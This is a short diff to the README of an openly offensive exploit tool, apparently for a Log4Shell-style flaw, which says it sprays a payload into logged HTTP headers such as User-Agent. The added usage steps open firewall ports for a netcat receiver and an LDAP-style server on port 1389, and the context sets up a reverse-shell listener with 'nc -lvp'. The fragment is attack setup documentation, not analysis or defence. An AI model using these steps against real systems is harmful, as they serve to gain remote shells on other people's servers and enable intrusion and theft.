@@ -5,6 +5,14 @@
 fully independent exploit does not require any 3rd party binaries.
 The exploit spraying the payload to all possible logged HTTP Headers such as `X-Forwarding , Server-IP , User-Agent` 
 ### Usage
+open firewall ports
+```ufw enable
+ufw allow <netcat port>/tcp
+ufw allow 1389/tcp
+ufw allow <http_port>
+ufw reload
+```
+
 reverse shell receiver
 ```
 nc -lvp <port>
